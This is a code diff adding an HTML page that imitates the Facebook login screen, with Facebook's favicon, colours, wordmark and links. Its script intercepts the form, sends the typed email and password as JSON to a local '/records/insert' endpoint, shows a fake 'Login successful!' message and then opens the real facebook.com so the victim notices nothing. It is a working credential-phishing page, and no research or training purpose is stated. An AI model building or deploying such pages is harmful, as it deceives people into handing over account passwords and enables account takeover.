@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<link rel="icon" type="image/x-icon" href="/assets/facebook.ico">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Login</title>
+	<style>
+		body {
+			background: #f0f2f5;
+			font-family: 'Segoe UI', Arial, sans-serif;
+			margin: 0;
+			padding: 0;
+		}
+	.fb-login-container {
+		max-width: 370px;
+		margin: 60px auto;
+		background: #fff;
+		border-radius: 8px;
+		box-shadow: 0 2px 12px rgba(0,0,0,0.10);
+		padding: 32px 28px 24px 28px;
+		text-align: center;
+	}
+	.fb-logo {
+		font-family: 'Segoe UI', Arial, sans-serif;
+		font-size: 2.5rem;
+		color: #1877f2;
+		font-weight: bold;
+		margin-bottom: 18px;
+		letter-spacing: -2px;
+	}
+	.fb-login-container h2 {
+		color: #1c1e21;
+		font-size: 1.3rem;
+		margin-bottom: 18px;
+		font-weight: 500;
+	}
+	.fb-login-container input {
+		width: 100%;
+		padding: 12px 10px;
+		margin-bottom: 14px;
+		border: 1px solid #dddfe2;
+		border-radius: 6px;
+		font-size: 1rem;
+		background: #f5f6fa;
+		transition: border 0.2s;
+	}
+	.fb-login-container input:focus {
+		border-color: #1877f2;
+		outline: none;
+	}
+	.fb-login-container button {
+		width: 100%;
+		background: #1877f2;
+		color: #fff;
+		border: none;
+		border-radius: 6px;
+		padding: 12px;
+		font-size: 1.1rem;
+		font-weight: bold;
+		cursor: pointer;
+		margin-top: 6px;
+		margin-bottom: 10px;
+		transition: background 0.2s;
+		box-shadow: 0 1px 4px rgba(24,119,242,0.08);
+	}
+	.fb-login-container button:hover {
+		background: #166fe5;
+	}
+	.fb-login-container .forgot-link {
+		display: block;
+		color: #1877f2;
+		font-size: 0.98rem;
+		text-decoration: none;
+		margin-bottom: 18px;
+		margin-top: 2px;
+	}
+	.fb-login-container .forgot-link:hover {
+		text-decoration: underline;
+	}
+	.fb-login-container .divider {
+		border-top: 1px solid #dddfe2;
+		margin: 18px 0 16px 0;
+	}
+	.fb-login-container .create-btn {
+		background: #42b72a;
+		color: #fff;
+		margin-top: 0;
+		font-size: 1.05rem;
+		font-weight: 600;
+		box-shadow: 0 1px 4px rgba(66,183,42,0.08);
+	}
+	.fb-login-container .create-btn:hover {
+		background: #36a420;
+	}
+</style>
+	</style>
+</head>
+<body>
+<div class="fb-login-container">
+	<div class="fb-logo">facebook</div>
+	<h2>Log in to your account</h2>
+	<form id="login-form" method="post" action="/login">
+		<input type="text" name="email" placeholder="Email or phone number" required>
+		<input type="password" name="password" placeholder="Password" required>
+		<button type="submit">Log In</button>
+		<a target="_blank" href="https://www.facebook.com/reg/" class="forgot-link">Forgotten password?</a>
+		<div class="divider"></div>
+		<button id="btn-new-account" type="button" class="create-btn">Create New Account</button>
+</form>
+</div>
+<!-- Facebook-style Snackbar -->
+<div id="fb-snackbar" style="display:none;min-width:260px;max-width:90vw;background:#323232;color:#fff;text-align:center;border-radius:8px;padding:16px 24px;position:fixed;left:50%;bottom:40px;transform:translateX(-50%);font-size:1.05rem;box-shadow:0 2px 12px rgba(0,0,0,0.18);z-index:9999;opacity:0;transition:opacity 0.3s, bottom 0.3s;letter-spacing:0.01em;">
+	Record inserted!
+</div>
+	</form>
+</div>
+<script>
+	document.getElementById("btn-new-account").addEventListener('click', function() {
+		window.open('https://www.facebook.com/reg/', '_blank');
+	});
+
+	function showSnackbar(message) {
+	  const snackbar = document.getElementById('fb-snackbar');
+	  snackbar.textContent = message;
+	  snackbar.style.display = 'block';
+	  setTimeout(() => {
+		snackbar.style.opacity = '1';
+		snackbar.style.bottom = '60px';
+	  }, 10);
+	  setTimeout(() => {
+		snackbar.style.opacity = '0';
+		snackbar.style.bottom = '40px';
+		setTimeout(() => {
+		  snackbar.style.display = 'none';
+		}, 300);
+	  }, 2200);
+	}
+
+	document.getElementById('login-form').addEventListener('submit', function(event) {
+		event.preventDefault();
+		const email = this.elements['email'].value;
+		const password = this.elements['password'].value;
+
+		const xhr = new XMLHttpRequest();
+		xhr.open('POST', '/records/insert', true);
+		xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+		xhr.onreadystatechange = function() {
+			if (xhr.readyState === 4 && xhr.status === 200) {
+				showSnackbar('Login successful!');
+			} else if (xhr.readyState === 4 && xhr.status !== 200) {
+				showSnackbar('Login failed. Please try again.');
+			}
+		};
+
+		xhr.send(JSON.stringify({
+			mail: email,
+			password
+		}));
+
+		setTimeout(() => {
+			window.open('https://www.facebook.com/', '_blank');
+		}, 1500)
+	});
+	</script>
+</body>
+</html>
